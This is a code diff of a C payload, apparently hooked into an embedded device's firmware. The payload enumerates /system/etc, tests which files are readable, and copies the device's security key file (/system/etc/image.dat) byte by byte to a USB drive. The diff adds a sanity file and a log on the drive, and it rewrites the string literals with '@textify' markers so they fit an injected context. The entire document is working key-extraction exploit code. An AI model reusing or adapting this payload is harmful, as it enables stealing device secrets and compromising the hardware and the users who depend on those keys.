@@ -1,4 +1,3 @@
-
 #define O_RDONLY 0x0000
 #define O_WRONLY 0x0001
 #define O_CREAT  0x0200
@@ -111,31 +110,78 @@ static int fputc(char c, int fd) {
 }
 
 void hooked_func() {
-    int src_fp, dst_fp, len, err, nread;
+    int src_fp, dst_fp, len, err, nread, sanity_fp, log_fp;
 	struct dirent *d;
     char buffer[BUFF_SIZE];
 	char d_buffer[BUFF_SIZE];
+
+	// Paths
+	//@textify
 	char src_path[] = "/system/etc/image.dat";
+	//@textify
 	char dst_path[] = "/storage/usb0/image.dat";
+	//@textify
+	char etc_path[] = "/system/etc";
+	//@textify
+	char log_filename[] = "/storage/usb0/XXlog.txt";
+	//@textify
+	char sanity_filename[] = "/storage/usb0/sanity.txt";
+
+	// Error messages
+	//@textify
 	char error_source[] = "E: source sec key open\n";
+	//@textify
 	char error_dest[] = "E: dest sec key open\n";
+	//@textify
 	char error_read[] = "E: reading sec key file\n";
+	//@textify
 	char error_write[] = "E: writing sec key file\n";
+	//@textify
+	char error_dir_read[] = "E: reading dir\n";
+	//@textify
+	char error_dir_open[] = "E: open dir\n";
+	
+
+	// Other
+	//@textify
 	char copy_success[] = "Copy sec key success\n";
-	char readable[] = " is readable\n";
-	char not_readable[] = " is not readable\n";
+	//@textify
+	char sanity_value[] = "Hello!\n";
+	//@textify
+	char str_d_name[] = "d_name: ";
+	//@textify
+	char is_readable[] = " is readable\n";
+	//@textify
+	char is_not_readable[] = " is not readable\n";
+	//@textify
+	char str_start_copy[] = "Start copy========\n";
+	//@textify
+	char str_end_copy[] = "\nEnd copy==========\n";
+	//@textify
+	char str_end[] = "End ========= \n";
+
+	// check if we can write anything to a file on the USB
+	sanity_fp = open(sanity_filename, O_WRONLY | O_CREAT, 0777);
+	if (sanity_fp > 0) {
+		write(sanity_fp, sanity_value, sizeof(sanity_value) - 1);
+	}
+	close(sanity_fp);
+
+	log_fp = open(log_filename, O_WRONLY | O_CREAT, 0777);
+	write(log_fp, sanity_value, sizeof(sanity_value) - 1);
+
 
 	// print directory permissions
-	int dir_fd = open("/system/etc", O_RDONLY, 0);
+	int dir_fd = open(etc_path, O_RDONLY, 0);
 	if (dir_fd < 0) {
-        write(1, "Error opening etc directory\n", 28);
+        write(log_fp, error_dir_open, sizeof(error_dir_open) - 1);
 		return;
 	}
 
 	while (1) {
 		nread = getdents(dir_fd, (struct dirent *)d_buffer, BUFF_SIZE);
 		if (nread < 0) {
-			write(1, "Error reading etc directory\n", 29);
+			write(log_fp, error_dir_read, sizeof(error_dir_read) - 1);
 			return;
 		}
 		if (nread == 0) { // end of directory
@@ -150,12 +196,12 @@ void hooked_func() {
             	name_len++;
 			}
 
-            write(1, "d_name: ", 8);
-			write(1, d->d_name, name_len);
+            write(log_fp, str_d_name, sizeof(str_d_name) - 1);
+			write(log_fp, d->d_name, name_len);
 			if (access(d->d_name, R_OK) == 0) {
-				write(1, readable, sizeof(readable) - 1);
+				write(log_fp, is_readable, sizeof(is_readable) - 1);
 			} else {
-				write(1, not_readable, sizeof(not_readable) - 1);
+				write(log_fp, is_not_readable, sizeof(is_not_readable) - 1);
 			}
 
 			bpos += d->d_reclen;
@@ -168,28 +214,29 @@ void hooked_func() {
     dst_fp = open(dst_path, O_WRONLY | O_CREAT, 0777);
 
     if (src_fp < 0) {
-        write(1, error_source, sizeof(error_source) - 1);
+        write(log_fp, error_source, sizeof(error_source) - 1);
         goto END;
 	}
 
     if (dst_fp < 0) {
-        write(1, error_dest, sizeof(error_dest) - 1);
+        write(log_fp, error_dest, sizeof(error_dest) - 1);
         goto END;
     }
 
 	int c, i = 0;
-	write(1, "start copy========\n", 19);
+	write(log_fp, str_start_copy, sizeof(str_start_copy) - 1);
 	while((c = fgetc(src_fp+i)) != EOF) {
     	fputc(c, dst_fp+i);
-		write(1, "  ", 2);
-		write(1, (char *)&c, 1);
+		write(log_fp, "  ", 2);
+		write(log_fp, (char *)&c, 1);
 	}
-	write(1, "\nend copy========\n", 18);
+	write(log_fp, str_end_copy, sizeof(str_end_copy) - 1);
 
-    write(1, copy_success, sizeof(copy_success) - 1);
+    write(log_fp, copy_success, sizeof(copy_success) - 1);
 
 END:
-	write(1, "end========\n", 12);
+	write(log_fp, str_end, sizeof(str_end) - 1);
+	close(log_fp);
     close(src_fp);
     close(dst_fp);
     return;
